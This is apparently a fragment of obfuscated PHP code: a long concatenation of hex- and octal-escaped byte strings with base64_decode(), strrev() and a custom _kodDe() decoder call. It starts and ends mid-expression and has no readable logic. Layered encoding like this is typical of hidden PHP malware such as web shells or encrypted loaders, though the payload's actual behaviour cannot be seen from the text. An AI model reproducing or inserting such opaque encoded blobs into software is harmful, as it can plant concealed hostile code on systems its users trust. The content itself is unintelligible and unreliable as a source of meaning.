f\x18\x42\xbd\x20\x3c\x54\x19\xcc\xd0\xcb\x31\x2b\x20\xb1\x6\x89\x78\x22\x10\x1e\xdb\x53\x97\xf7\x84\xa9\xd8\xb6"."\65\130\347\60\261\50\240\162\273\172\1\150\75\202\27\22\72\230\213\130\21\10\265\356\76\141\45\305\76\152\345\16\250\322\333\112\46\351\374\140\30\56\151\305\275\77\125\353\40\34\0\333\304\117\211\254"."\xf0\x32\x5e\x21\x7c\xde\x4a\x18\xfc\xf5\x2d\x67\xd0\xc0\x99\x44\x42\xa0\xea\xb2\xfd\x15\x71\xf7\xb0\x42\xf\x5a\x7b\xa9\xac\x3b\x10\x5f\x77\xc3\xd3\x13\x36\x92\x85\x18\x3a\x41\x76\x21\xc7\x76\x5c\x65\xb5\x45\xed\xa7\xcc\x48".base64_decode('RplUzFCfXAXm/BY2FUttHK/wBZKJZXHRQ2dXMp2xgRhjlAEUrp0jE0ugMlLZ1qNtBLJHdi9y1Us=')."\xd5\xfd\x2a\xd0\x8b\xc6\xd\xa9\x37\x2a\x35\xbb\x1a\x97\x49\xfd\xc1\xfe\xe6\xa6\x1a\x9\x68\x68\x39\xa5\x5f\x49\xac\x56\x4d\xf7\xa2\x85\x8b\x5d\xb\x9b\xa5\xea\xd5\xdd\xd1\x9e\x80\x43\x82\xb7\x61\xa4\x2e\xa0\xf1\x69\x35\x52"."\x47\x56\xd7\xf2\x8a\xbb\x71\x31\xb4\xeb\x6f\x5a\xb4\xd0\xb5\xb4\x49\x8a\xc8\x69\x59\x57\x49\x2e\x22\xe1\x12\xf8\x97\xde\x59\x84\xcf\x27\xc5\x85\x2a\xc7\x85\xa5\x20\x9e\xa4\x71\x18\x1d\x8d\x43\xee\x93\x4\x4\x7c\xa\x44\xce"."\x9a\x6\x61\x51\xc4\xc4\xe\xb0\x38\x7a\x98\x49\x2c\xd\x95\x40\x6c\x69\xc4\xf5\x26\xc4\xb5\x32\x87\xb5\x58\x88\x30\xc4\x71\x25\xf8\xa\x8b\xe5\x78\xeb\xc8\x93\x49\x2a\x1c\x43\x7c\x2c\x42\x59\x2f\xf0\x1f\x8c\x32\x6e\x83\xc6"."\307\71\361\71\233\176\65\305\16\207\7\143\306\120\155\314\335\243\244\124\271\135\233\300\321\101\364\203\354\23\241\261\127\15\214\326\375\57\321\332\330\20\65\16\202\37\354\126\370\152\312\75\57\344\355\164"."\162\164\266\172\103\336\157\271\17\147\122\61\344\316\217\177\201\226\117\113\217\332\27\157\70\214\135\333\343\160\7\354\5\60\347\173\331\324\6\4\66\217\240\116\262\340\62\73\21\135\113\225\222\264\310\220".base64_decode('JVZMpdeIi0gvGVdIyxIfopkAajZrkR4rDKGxD6GoHRhWa2kbhtXNm+cLdjKjQI4x0Vg/ZI21VQ8=')."\26\322\103\155\65\325\60\343\24\201\341\122\50\171\351\303\104\226\252\210\137\265\220\267\116\113\14\273\125\262\302\163\23\376\101\165\133\276\274\332\125\133\263\142\5\137\0\272\41\23\132\112\140\165\206\116"."\xc\xcb\xcb\xb6\x44\xc2\x14\x59\x67\xe\xf\xdd\x40\x93\xd0\x27\x8b\xdf\x3a\xa7\x82\xd1\x49\x66\x78\x8c\xf6\x6d\x73\xba\xfd\x5e\x42\xf0\xc1\x21\x1c\x58\xe\x68\xb2\x7e\xc5\x50\x6d\xcd\xe0\x8a\xa\x10\x96\x2f\xa4\x2b\x63\x15"."\x9b\xc\xe8\xc6\xfa\x3b\x46\x9e\x53\x8a\x11\x5d\x3d\x46\x5f\x59\x22\xa6\x6e\x31\x62\xeb\x46\xcd\xd2\x98\x99\x1a\x6d\x4a\x75\x2c\x16\x4b\x21\x87\xd3\xcc\xa4\x98\x40\x98\x8f\xf2\xea\xa3\x40\xbc\x51\xc4\xc0\x0\x8a\x70\x14\xc5"."\x5b\x3e\x28\x3b\xd3\xa8\xae\x2b\x0\x32\xb3\x34\x5d\xee\xaa\x5d\x31\x97\x66\x46\x5b\xfc\x94\x41\xf6\x99\x4d\x6f\x5\x75\xd7\xb2\xaf\x4f\x74\xfa\xc0\x1f\x63\xca\xf9\xa4\x78\xb4\xfb\x4f\x90\x81\xa8\x76\xfa\x7a\xa3\xfe\xa8\xdf"."\107\114\251\147\314\232\275\367\76\204\6\304\154\161\237\331\264\110\100\334\330\104\175\75\370\133\12\376\144\360\227\4\177\51\310\302\61\3\374\273\4\374\201\224\205\0\272\120\211\115\54\112\200\77\220\272"."\x18\xfc\x2e\x86\x58\x69\xf0\xb7\x88\x4b\x91\x15\x2b\x78\xc1\xa0\xb5\x1e\x67\x27\x68\x76\xa5\xc2\x41\x96\x15\x8c\xc3\x85\xa\xc2\xd5\x7a\x82\xdc\x86\xe7\x5b\xfd\xd0\x9f\xbf\x42\x7d\x49\xa4\xe5\x1c\x9d\x32\xc5\xb7\x9e\xe0\x27"."\143\72\34\167\160\324\361\341\121\15\57\345\41\74\70\132\53\324\204\343\62\114\113\43\246\343\341\276\157\306\22\207\61\153\126\235\323\125\337\320\270\260\151\121\363\342\45\144\17\271\120\312\53\72\335\52"."\161\43\157\177\13\341\217\232\242\77\174\23\306\272\243\132\64\350\355\364\74\273\370\15\144\43\151\317\204\140\46\143\210\206\105\43\312\144\17\335\131\200\123\145\32\36\322\120\227\0\355\41\302\71\356\330".base64_decode('IJQ2McqJ0OGpYKpCYpEs9T4/r74x1cL+scFIn8oZwyXUFT/uI5dAm6iR1DB154B8GwrvAAEmMDo=').base64_decode('8EGisLMLSxTKFnYTURw+jEQVIgzIJaj3djFNAK90ASUq7fIN+DtdHfBdo0iRXUo2wl3tOMQCqPI=')."\56\270\134\53\50\71\172\16\12\217\300\302\154\216\3\115\162\14\27\225\214\243\130\310\70\62\152\332\221\310\27\35\246\232\116\303\177\34\240\17\35\305\144\312\141\214\145\34\112\132\236\160\214\53\211\42"."\x75\xe3\xac\x37\x3a\x14\x3d\xed\x18\x49\x25\x1d\xa9\xa4\xee\x48\x81\x2\xa\xfa\xb8\xa3\xa0\xa4\x1d\x1a\x80\xeb\xe3\x8d\x8e\x22\x8\x1b\x0\x26\x83\x3f\x43\x6f\xc4\x19\xc7\xd4\x94\xa2\x81\x45\x91\xa1\xe5\x4a\xc8\x2c\x69\x62"."\x1a\x38\x59\x4a\x71\xc8\x80\x85\xa\xfe\x4e\x6f\xbd\x6b\x20\xcc\x52\x27\x1c\xd3\x24\xd8\x8b\x59\xfb\xb5\xc5\x4c\x5a\x8a\x59\x6b\x2f\x46\x4c\xf4\x52\xff\xdb\x2b\x71\x97\xd0\x38\x7e\xaa\x49\xce\x41\x7f\xde\xe4\xbf\x89\x7c\xd1"."\5\377\220\32\241\100\104\7\352\363\225\320\235\200\140\127\340\242\210\350\270\144\222\53\43\232\256\2\165\131\256\134\221\240\75\321\320\322\346\70\63\160\22\121\43\44\105\250\33\251\10\113\41\161\243\34"."\xd3\xd2\xa\x4d\x8f\xb2\xc7\x4c\x12\xaa\x19\x2\xb\x68\x99\x5b\xfc\xe1\xde\x4\x70\x23\x5e\x84\x57\x19\x85\x24\x8\x4\xd8\x21\x75\x82\x5e\x29\x5e\xe9\xc2\x7\xab\x1c\xbf\x8\x13\x1d\xc\xae\xcb\xe3\xb6\x34\xc2\x84\xb6\x41".base64_decode('UHmAgHLg6KCFwR3NONzQFFq20uXv9oZdqDx0641/G54W6uLdefxRpmAzxExOS8i5OC6DHzrJBSA=')."\x55\xd8\x15\xf1\x95\x2e\x1c\x7\xa5\xb9\xac\x29\x19\x6a\x4c\x94\xd3\xa\x19\xd5\x2c\xa5\xac\x6d\xea\xa\x45\x50\x55\x4a\x20\x83\xcb\x86\x92\x3\xe5\x7d\x43\x6\xb\x86\x9c\xfb\x26\x7c\x2b\x46\x4a\x19\x53\x93\x4a\x8f\x3c\x52"."\201\241\40\224\262\114\236\141\340\34\134\306\133\162\300\135\21\226\205\277\271\203\204\257\227\155\351\211\131\374\64\11\356\143\3\322\321\334\50\113\212\303\205\202\74\202\10\25\213\302\242\225\26\40\12\332"."\x24\x90\x8c\xf4\xfa\xa0\x7\x30\x1a\xb4\x9e\xe9\x14\x57\x1e\xa4\x98\x8e\x60\x4f\xa8\x2f\xea\xf3\xba\x2a\x22\x51\xa0\x70\xf2\x20\x72\x65\x85\x64\xb8\x8d\xc\x96\xeb\x68\x23\x71\x9a\x5c\xd3\xa0\x20\x6b\x2a\x50\x18\xdf\xfa\x14"."\63\225\247\166\102\73\172\321\30\117\104\57\113\24\0\376\302\302\105\371\174\247\232\253\60\21\175\15\32\110\52\31\136\100\140\271\140\33\241\214\206\25\120\374\221\40\152\50\230\245\370\73\250\342\27\53"."\42\364\147\125\123\151\227\163\145\237\102\131\312\123\51\165\270\321\134\45\332\361\124\12\151\127\145\143\232\136\52\103\361\255\21\46\142\22\224\223\16\71\145\32\16\271\344\220\363\272\103\36\323\35\11\255".base64_decode('MOJIGWnwZzjA1AuT0zmAmJMdOSDAHHk1pTryIKCajom8w1iYJ5NwvggSiwsdWlp36COgSCMLx8Y=')."\210\143\134\36\163\214\347\145\107\276\111\166\150\231\214\143\154\64\355\30\37\163\214\151\111\207\111\367\176\251\232\24\67\104\13\275\321\222\232\34\201\140\27\374\7\364\113\276\150\304\113\5\165\202\172\273"."\xce\x6b\xda\x98\x94\x1f\xcb\xa6\xbe\x9\x1f\xfb\xa4\xb6\xe3\x63\xa5\x4\xc8\x3d\x5d\x33\x46\x64\x17\xb2\x14\x52\x74\xfb\x74\xc4\xd2\x7\x9\xc2\x14\x34\xa5\x3\xbd\x2d\x17\x8b\xe\xa0\xd0\xa4\xc0\xb2\x13\x5d\xff\x1c\xb2\xe7".base64_decode('5PUZZLMgNUeKQ01NzIErQz+B9QTByAIm4pkrrlu2v5kzDLidIqqoROUCxVGHMnhmFGzhMcp0M6M=')."\xfd\xf3\x16\xd0\x20\xd0\xb7\xc7\x1a\xa6\xe0\xbf\x8d\x53\x32\x90\xad\x63\x9a\x9e\x50\xd\xfa\x30\x11\x6b\xfa\x90\xa8\x6c\x7e\xfb\x4c\xa2\x30\xfc\x1f\x72\x71\xfd\x34\xa3\x14\xf4\xff\xf9\xab\x42\xa6\x49\x85\xde\x45\xf9\xf6\xd9".strrev('ùèuZ#^G1³mC‚n‘Ìt£kØèkR	yø»Õv¤¡&¨«†H#ßÌ ùez(@y')."\xb1\x84\x23\x3f\x32\x6\x2\x50\x67\xce\x83\x71\x8\xc2\xa\x50\x9\x8d\xf1\x34\x19\xbb\xb\x33\x8d\x8e\x85\x99\xa2\x43\x6\x3\x3f\xa1\x2\x9\xa0\x8e\xa5\x1d\x5\x63\xcc\x1\x46\x3f\xf8\xff\xb8\x9\x8a\x3\xbf\x79\xa0\x8b"."\xe4\xa1\x86\x9e\x7\xaa\xfa\x98\x96\xa0\x62\x7\x1a\xc2\xba\xb4\x2\xf4\xda\xf\x7d\xda\xbb\xc6\xe1\xd6\x9d\x63\x3a\xe5\xba\x1c\x3f\x8b\x76\xde\xca\x33\xb0\x57\xe1\xbf\xad\x18\x70\x58\x7\x6c\x92\x6c\xaa\xc5\x85\xeb\x1\xdf"."\132\104\330\312\302\311\102\111\270\266\150\15\43\214\310\225\56\322\12\254\45\302\4\7\323\77\71\32\311\14\217\132\222\361\234\246\215\224\212\202\50\300\251\170\225\155\270\6\353\33\246\32\206\134\174\170"."\x7f\x13\x26\x2e\xf6\x9b\xb0\x90\x60\x10\x90\x38\x65\x30\x3a\x4a\x8f\x7f\x7d\x15\xc9\x97\x84\xc\x53\x7c\xd\xc9\xe5\x26\x97\x97\x53\xa2\xbc\x9c\x22\xc2\x6e\xc8\xa2\xfc\xda\x99\x83\x49\x5d\x98\x0\x89\x40\xf7\x42\xc9\x6f\x99"."\324\35\324\301\232\121\34\127\25\126\17\104\345\242\302\230\276\163\156\251\10\33\174\137\203\145\23\363\26\341\156\21\321\171\66\171\133\126\302\145\140\324\51\70\134\46\317\365\144\126\245\247\116\350\324\204"."\x2b\xfe\xa5\x2\x5d\x1a\x28\x29\x41\xdf\xa7\xf\xbe\xb\xcf\xcd\x80\x16\x81\x15\x1a\x74\x1a\xc2\x40\x80\x88\xc2\x2b\x13\x82\xf5\x94\xc6\x34\x14\x34\x58\x70\xb0\x2b\x10\x6c\xf7\xa0\x7b\xfe\xf1\xee\x20\x7d\x30\xb9\xb5\x75\x5"."\xda\x32\x66\x6f\x3d\x3\x7e\x71\x82\xf\x65\xd8\xe3\x85\xfd\xb2\xe\xd\x18\x1c\x51\x62\xba\x26\x91\x54\x49\x2b\xb0\x63\x2d\xb2\x2f\x36\x8e\x51\x71\x24\xd4\x1d\x8a\x7b\xfa\xa2\xdd\x82\xaf\x4\x6\xa\x11\xb\x1c\xf4\x32\x34".base64_decode('hATD/nUe7hkpIRt0v6i/v98J99vhRY8kelS6HSZKUBDmW6tGtFQyp5VSVbxAd4OrXmqqb5D6CtQ=')."\304\221\56\217\350\113\341\5\315\51\74\361\147\173\53\334\232\150\171\306\226\176\34\47\201\265\4\140\53\141\305\34\34\123\164\301\132\237\276\314\114\176\173\202\153\210\25\156\107\60\104\366\17\172\126\63"._kodDe('KAoxSKVAmj1pic++tVxqlRi8UWkCU3rbx4zUpJjJCxdg9xt4ktjHo2Nw6KrMo0o/9iRoSf3tG9uA')."\156\216\110\172\54\24\16\206\72\375\314\113\102\10\166\1\331\36\43\317\215\323\227\343\311\247\54\166\332\125\200\322\125\334\116\273\12\325\251\112\242\36\335\320\315\27\34\144\256\62\305\53\241\304\326\21"."\x5e\xed\x12\xe8\x0\xa3\xec\x76\x8\x62\x10\xaf\xf\x5e\x86\x17\xd8\x23\xcb\x76\xc1\x6d\x57\x12\x30\x90\xdc\x8a\xeb\x16\x6f\xc5\x1\x42\xc0\xf9\x9\x9e\x90\x43\xaa\x42\xc2\x24\xa1\xb9\x10\x1a\x34\x98\x34\x96\x74\x96\x2b\xa3"."\230\344\124\26\301\141\355\122\156\70\357\70\361\23\352\232\76\11\63\333\320\52\176\224\132\75\241\213\364\374\214\231\34\135\223\121\56\134\252\345\27\202\23\354\242\0\50\22\235\327\331\72\232\104\43\255".base64_decode('VeTWHB0XUBhWrcByb3mkRZmAnQqavCKInlfu1Uxk9rTcLaYBRCA1DLAAXsG6C2JQICoOthpVZYU=').strrev('Åu:a’ùëê›šK­j ?+ÂĞqZ\'¬B$J‰·¢®vÆğªE²}dk°Âi™-scobE½zái•')."\xfa\xd6\x29\x24\x94\xd4\x48\xc6\x5d\xc4\x89\x7\xb6\x73\x8d\xa\xe4\x81\x97\x5e\x1e\x46\x4f\x9d\xb7\x48\x64\x20\x38\x24\x3a\x3e\x70\x28\xe4\x89\x76\x74\x3b\x24\xc4\xac\xe\xa9\xcb\x17\x5\xe0\x3e\xf0\xf\xb6\xb0\x77\x48\x70"."\134\203\144\60\316\35\22\274\272\353\220\372\172\361\57\267\216\6\264\303\154\201\356\266\40\122\202\70\344\150\312\64\156\22\45\111\160\304\102\363\30\102\165\14\240\75\232\157\351\127\13\13\33\241\161\64"."\276\275\3\327\351\204\31\200\164\54\351\205\26\354\352\307\160\346\325\44\230\325\301\214\352\4\54\321\2\155\360\254\145\320\203\314\377\377\22\140\55\250\205\366\377\177\51\320\144\302\143\202\111\46\121\62"."\25\343\177\52\203\12\70\106\52\154\126\264\202\314\12\15\122\143\175\275\24\134\15\321\110\312\154\41\27\45\62\221\5\270\177\160\237\20\363\214\224\74\106\137\123\315\302\101\246\26\212\324\357\41\22\124".base64_decode('oOPDwivzmnU6iFqkNWlYikpq0tvQuDwFFxkg7yRrB5zbxxSYRomFMbEoS7Wgr2ApxsAWRFAgxgQ=')."\203\74\127\62\100\141\34\33\247\61\364\24\234\207\126\250\5\370\370\252\211\144\33\206\60\4\155\274\240\320\101\17\363\303\353\155\156\4\164\163\301\14\363\141\104\226\217\370\211\134\341\307\105\53\20\205"."\302\254\255\202\227\231\126\320\121\241\25\345\321\222\302\340\55\266\121\302\332\214\62\61\66\260\121\214\142\131\110\313\330\5\27\11\337\77\163\106\321\67\270\0\52\340\31\242\105\202\216\206\235\100\236\214".strrev('˜“m]±ğ!WÇ¯u“Ü´Ÿ`°jf%GPE}81‰Òá[™ÚÿvœL­:€^2ä‰•')."\237\166\42\17\361\317\30\232\246\210\220\206\332\50\11\217\201\361\0\35\204\246\32\354\200\106\212\255\245\323\160\73\202\304\10\26\132\117\322\54\170\261\110\143\305\234\134\120\350\173\367\143\40\253\250\330"."\xae\x11\x33\xae\xb1\x66\x64\xa8\x34\x59\xd8\x5b\x17\xab\x1e\xc7\x77\x4\x9\x64\x22\x5e\x54\x72\x78\xb3\x4\xdd\xde\xa2\xf0\xc9\x69\xe0\xc9\x9c\xe\x9d\x89\xa5\xc4\xb8\x9a\x87\x47\x8c\x32\xab\xa4\xe\x54\x76\x20\x8d\x46\x28".strrev('Ôd¸'."\r".'%x¨»è’n"ÖdÉ%v‚ïjYwt;¸Èîá#¡ay'."\0".'`‚2³Î@•È’‚”WFN')."\164\105\70\74\232\253\230\120\244\132\335\70\267\330\311\12\266\64\2\72\74\254\106\147\22\102\112\130\63\331\334\312\257\324\240\244\164\216\232\171\371\173\272\342\235\1\177\50\216\124\374\140\157\324\23\260"."\45\0\231\31\365\167\224\201\333\203\324\305\253\255\326\211\274\325\14\115\55\240\151\76\304\135\321\200\250\154\60\27\246\304\63\40\311\3\155\372\161\160\331\362\204\356\246\267\3\23\302\202\307\310\313\71"."\146\320\344\246\166\346\156\243\204\103\324\133\111\300\117\306\216\233\254\357\2\152\202\164\163\250\43\260\16\64\1\72\225\10\206\75\341\265\334\201\55\110\211\172\302\323\244\300\74\304\47\34\165\123\266\154"."\xe5\xca\x95\xf4\x55\xcd\x64\xe\x5f\x27\x84\xb6\xfd\xec\xbc\x1c\x40\xe1\xee\x93\x52\xe\x95\xcb\x31\xa1\x59\x1e\xba\xc7\x63\x39\x6f\xf\xcb\xba\x7\xb7\xa0\x42\xe2\x3a\xb5\x38\x4d\xa2\x5a\xa4\x6f\x22\x16\xa9\x79\x79\xb1\x94"."\xc0\x21\x93\x6d\xa7\x9\x2e\x64\x16\x93\xdf\x9\xf2\x9b\xd8\x48\xd8\x5a\xd6\x89\xed\x40\x52\x26\xf9\x55\x83\xbe\xf5\xb0\x11\x9a\xbe\xd1\x30\x98\x69\x72\x7c\x1f\x13\x19\x3\xf\x49\x1d\x72\x61\x81\x29\x5\x1\xda\x32\xa9\x7"."\136\44\52\144\244\215\240\345\330\143\261\301\35\137\30\131\45\227\213\103\223\67\122\335\144\126\223\354\13\110\32\235\376\33\274\30\2\56\121\173\15\50\74\101\5\311\240\42\43\131\70\355\347\156\36\310"."\125\67\227\213\30\361\100\357\0\100\230\130\221\220\43\112\172\355\37\155\33\304\201\234\23\374\25\102\115\111\202\123\13\272\276\140\161\255\262\132\113\221\156\153\301\376\124\122\312\304\62\11\71\13\42\36"."\260\53\373\347\101\237\221\300\147\340\125\55\11\137\112\265\30\10\142\204\62\110\213\305\316\20\47\224\127\170\136\175\103\275\160\25\303\337\341\213\304\127\105\240\353\313\200\237\272\152\261\46\370\101\132\64"."\x3c\x4d\x8a\x27\x3c\x5d\x4a\xb0\x7d\xd5\x34\x29\x1d\x74\xfd\x60\x4d\x9\x4\x83\x11\xd1\x2b\x90\xad\x7a\x7d\x21\xc1\xdf\x1f\x59\x1f\xc3\xb9\xbb\x81\x58\x82\xf6\xf6\x5\x88\xfc\x8a\x11\xe\x8e\x11\x59\xdc\x41\xcc\x9b\x62\xa5".strrev('îf®«µwn¾GAGä•2º'."\0".'É;XO¯ ¤ V°P’Í¾2’–4+CXpÌ·Œå¼.&Ò%–ôMõy')."\x51\x79\x11\x16\xab\x85\xc0\x58\xad\xfb\xa8\x3e\x52\x8d\xa3\x38\xc\x20\xcc\x65\x70\xf7\xfa\xea\xaa\xa9\x5\x35\xae\xda\xea\x58\x43\xd\x33\xdf\x8a\xd1\x2b\x60\xb1\x58\x89\x18\x3f\xd\x6d\x6a\xda\xcc\xdd\xa\xc6\x6\x5d\xb5"."\xb1\xa1\xb9\x82\x35\xd9\x26\x0\xd8\xcc\x0\xe3\x59\xba\x1f\x86\xbc\x35\x30\x2c\xa3\xb6\x7a\xb0\x6a\xc1\x90\xab\x76\x70\x7d\x2c\x36\x4\x83\x35\x0\xd6\x2\xe1\xb1\x88\xab\xb6\xc6\xd1\x36\xd7\xdd\xa7\x1a\x22\x3e\x76\x8e\x3c"."\55\16\41\71\275\4\126\144\233\373\120\145\121\301\52\11\135\201\20\355\151\103\76\40\224\5\327\153\146\276\50\260\55\364\16\326\334\44\132\224\143\10\21\132\320\124\126\10\322\133\127\105\156\131\157\65"."\246\145\121\313\150\251\227\332\201\252\146\271\1\154\361\17\47\324\116\257\23\12\212\213\136\21\21\104\174\133\3\306\205\107\111\205\272\2\175\115\160\144\2\13\242\216\176\60\14\272\3\230\306\363\15\166"."\102\1\32\40\324\11\211\26\27\134\360\323\42\301\104\333\155\363\340\104\226\121\345\64\304\141\300\310\144\150\41\74\360\51\264\256\241\276\71\270\241\370\170\202\120\0\322\70\156\373\40\273\110\234\23\226".base64_decode('o9wGBmkT3AqLRqmKlJSL8LwmhXfGAeHJt1moLwT9pkFJEKd7qALI3+uPR/zrfGUJ0M1v5RQw30c=').base64_decode('/VT9EeC9QeSqzALv613dG+yvhBrtCXFdQkjq8PRG48KaFC9WwJKLrVaoFXtSTy5sTLBhxlx4UV0=')."\236\214\24\374\43\272\5\230\160\62\243\176\272\336\361\162\157\36\44\33\332\170\45\125\100\276\115\110\6\161\27\107\114\166\110\25\367\160\330\202\112\227\13\106\132\321\155\333\223\11\265\40\123\107\245\171".base64_decode('+u08u8YGHRxRpzDoyhnVDMSz6yI7ACT3vHSQqqfgpSRhz65ghpWMGA1ozGYPzeYVioDv1wh3S+A=')."\x22\xc5\x93\x34\x4b\xe2\x3b\x39\xc2\x2b\xe4\x20\x26\xbc\x8\x2f\xdc\xaf\x73\x36\x48\xac\x45\x71\x5c\x32\x8e\xd4\x9\x9\xd8\x52\xbc\xc2\x1d\x3d\xdb\xfd\x7e\x74\xe9\x15\xf\x5e\xe8\x37\xb7\x10\x29\x25\x98\xef\x16\xdb\xa5\x3a"."\352\15\124\22\257\263\121\177\237\260\0\364\264\13\154\201\41\246\201\142\341\43\304\274\145\142\26\364\315\262\54\70\15\336\72\343\242\114\114\61\240\101\126\37\125\273\52\245\124\370\24\112\22\50\232\244".base64_decode('6zgyFREiruW0Mim9G50LiWMPTfTihu+sEeI6GyWBvaDsETgC70YwMvJbmDmOo0G/BMLVJH7LDz8=')."\112\303\272\26\275\136\303\142\272\160\3\114\111\321\256\103\257\277\124\234\113\60\20\75\17\123\361\216\24\46\26\114\366\132\274\102\332\20\300\220\267\246\223\267\344\205\312\130\63\350\330\113\236\127\341\116"."\x33\x50\x16\x5e\x67\xee\x4c\x13\x80\x34\xfc\x3a\xbd\x40\x4\xee\x6b\xd\x3f\x6d\x43\x7d\x80\x7a\x52\x29\x3b\x38\xaa\x31\x60\xb9\xbf\x36\x17\xf3\x5e\x4a\xbc\xa7\x83\x5\x68\xc4\x1f\xec\xad\xae\x81\x1a\x95\xe5\xee\x7e\xcf\x24"."\xf3\x6f\xd\x7a\xd\xcd\xd9\x3d\xf2\x4\xef\x14\x16\xa1\xa9\x8c\x27\xd\x4b\x4\x7b\x1f\xb4\xe4\x66\x20\x86\x35\xae\x10\xe1\xcb\x56\x58\xa1\xee\x90\x9b\x81\xda\x29\x99\xd8\x73\x26\xe4\x36\x33\x74\x26\x2f\x16\x1a\x24\xfa\xe9"."\70\276\2\205\43\35\55\314\41\43\135\376\214\347\325\244\24\10\166\301\265\267\327\37\131\55\145\24\123\342\112\17\72\244\260\216\162\344\170\1\155\352\121\46\117\120\23\26\24\164\242\15\20\247\305\45".base64_decode('DluRiJ4aYUFlBeNeF4uDuyfOFLvdasOlSkJZDvH7Qh64orHKBQQmax1rOZMKPAeo/O1She8S/Bw=')."\337\73\21\62\250\205\61\325\120\371\220\247\244\232\24\361\313\150\211\232\42\40\100\7\131\374\312\67\43\53\373\116\331\125\144\36\307\70\344\211\54\341\322\53\356\22\361\145\70\141\66\200\16\7\300\124".strrev('¨ˆèúæEµE5VÎÕ°ÊâºtwWa…‡YJ²‚V’9	åµIÂ¢A¼§^9'."\n".'EÔŠİmË')."\x3c\x6c\xb5\x63\xa9\x13\x34\x4c\xe0\xb2\xc3\xef\x75\xa0\x97\xbd\xb8\xdf\x51\x14\x4\xfa\xa4\x3\x6e\x6f\xa1\xa\x38\xf8\x11\x7d\x1c\x1d\x12\x93\x61\xa5\x6a\xe8\xe6\x29\xb9\xbe\x89\x61\xfe\x60\x1c\x3f\xef\x84\xa3\x6e\xbb\x8a"."\x9c\x46\x77\x43\xd1\xed\x22\xc1\x1\x8f\x9b\x6e\x39\x32\xa7\xd1\x70\xe7\xd9\x37\x41\xaa\xee\x32\x69\x8\x82\xf9\x65\x53\x98\x91\x3e\x73\x45\x2b\x8b\xa3\x76\x37\xaa\x59\x8b\x8e\x5c\x8e\xb\xd2\x24\x7e\x27\x9e\x21\x48\xad\x52"."\x3d\x72\xad\x80\xed\x69\xd0\xf9\xce\x72\xea\x20\x1e\x36\x1e\xdf\x53\x46\x4f\x7d\xf9\xf2\x45\xd3\x72\x87\xb9\x5b\x35\xf8\x43\xf\x48\x4d\xe0\xcb\x21\xa8\x7b\x69\xf9\xc9\x32\x80\xe5\x92\x7c\x80\x56\x83\x79\xfa\x84\xd7\x48\xa"."\151\115\154\31\22\131\76\40\32\34\50\204\357\106\73\340\116\265\31\102\114\20\120\306\24\153\366\151\313\62\354\262\236\311\151\213\140\104\21\201\217\320\245\124\301\121\72\375\205\356\147\230\176\11\253\42".base64_decode('KCLk1lKM/FIZaC8a9E0HsQqhDAijZYk9CjdDI3V1cLGOT6MBCIgBdBNH4GiaJnQ/NkcPY7+CLuw=')."\261\2\247\350\100\375\145\316\103\55\150\204\335\301\22\141\132\337\52\30\110\374\254\224\12\176\354\56\336\2\325\5\365\132\364\71\213\75\312\160\267\336\4\35\174\55\204\135\310\220\1\51\26\111\75\365"."\240\37\250\200\3\176\145\167\233\335\345\236\175\240\337\103\302\213\242\237\320\21\15\151\261\56\121\377\45\10\322\162\211\216\27\303\264\360\21\124\71\200\66\342\100\1\304\234\242\222\124\31\152\141\116\204"."\302\72\14\275\100\310\372\16\122\224\374\170\225\64\123\37\141\234\257\63\304\7\61\150\23\60\143\224\175\3\375\302\105\264\3\267\321\301\330\105\65\2\310\274\320\210\140\5\313\301\75\263\73\360\336\74"."\272\304\302\205\3\47\7\145\373\214\302\77\10\153\30\25\77\156\321\344\354\112\34\243\222\55\103\330\116\311\250\126\356\20\201\273\62\52\224\362\334\147\24\210\130\25\130\254\332\123\127\22\137\323\334\222"."\236\163\40\323\130\7\175\46\316\201\137\51\165\130\212\100\25\212\233\102\203\231\66\145\353\256\262\217\175\213\322\211\127\131\244\320\2\325\0\173\230\300\111\55\350\140\243\62\232\152\341\113\260\172\344\133".base64_decode('xviNy6JdUK7NpxoXLloqrhd5N3LHNY34h1j50K0xxhjSlIXPJPqwpjiyUaLVOS557VSQgjb59a0=')."\x86\x83\xa7\x92\xba\x89\x33\x9\x3b\x58\xac\x64\x81\x4\x95\xbe\xf2\xff\x5f\xf\xab\x7\x33\xb2\xe\xf4\x32\x1d\x53\x50\xc\x45\x15\x96\xd7\x1e\x3f\xbd\xf8\xed\xbf\x4f\x15\x36\xd9\xea\xc3\xa\xa5\x5a\x87\xbe\xb0\xed\xa0\x98"."\101\170\321\235\364\211\240\355\363\247\225\204\371\15\226\345\21\125\330\162\25\234\216\34\156\343\204\174\301\163\67\31\210\111\54\14\43\274\230\52\272\126\107\5\105\121\43\247\53\32\255\1\111\175\11\307".base64_decode('oMNy5PTN08W85cODRF4FGONiwtR4iin4cYeCJUh3zcAi0qJSgji/dSTwfcoGpBSAVRbGEeBvVVA=')."\13\211\276\304\25\20\324\120\301\221\17\131\246\162\112\171\310\200\111\71\304\167\142\101\224\61\12\221\350\144\344\41\307\271\370\263\202\374\246\265\313\10\241\136\152\230\17\43\302\206\14\122\343\130\142\126"."\324\360\340\303\100\123\26\245\206\325\2\111\231\112\74\213\53\1\31\221\114\42\50\110\45\33\264\334\105\27\146\141\36\102\75\353\110\105\15\372\232\231\10\26\307\34\67\223\210\350\106\136\230\351\104\141"."\x3a\x4b\x4c\x25\x9c\xe5\xb0\xc4\x48\x84\xab\x58\xc8\xe\x5a\x38\xd3\x41\x71\xe6\x8f\x93\xbe\xf2\x44\x1f\x7f\x92\x99\xd7\x16\xe8\x8e\x86\xad\x6b\xf0\x9e\xf\x41\xc9\xe5\xb8\xe0\x16\x5f\xf5\xc8\x25\x64\xdd\x5\x38\x6c\xc4\xa4"."\x2e\xbc\x2a\x45\xc4\x56\x56\x50\xc7\xa9\x4a\xc0\x1b\x50\x50\x93\x23\x15\x5c\xf6\x40\xfa\x43\x1b\x19\x41\x66\xa\x33\x4d\x19\x1a\x97\x29\x60\x42\x62\xb6\x6d\x34\x84\x74\x57\xa8\xa3\x90\xe7\xb1\x2d\x4f\x29\x4\xd9\x99\x6f\xd"."\x71\xf7\x36\xb4\x92\xa\x4\x38\xa\xe9\x66\x92\x28\xb\x2c\xa0\x32\x9\x12\xb5\x8\x6f\xb\xb0\x2\x13\x40\x5f\xe9\x94\x1f\x2c\x39\xa0\x73\xa0\x76\x41\x9\xc6\x48\xf4\x89\x3f\xe2\x91\x49\x14\x59\x82\x8f\xc0\x72\x6f\x4e\xe5"."\45\261\361\51\146\341\23\0\216\303\307\206\255\53\115\261\150\174\146\13\127\123\141\270\360\161\331\212\147\3\252\342\40\122\15\274\77\47\56\12\100\110\254\50\35\20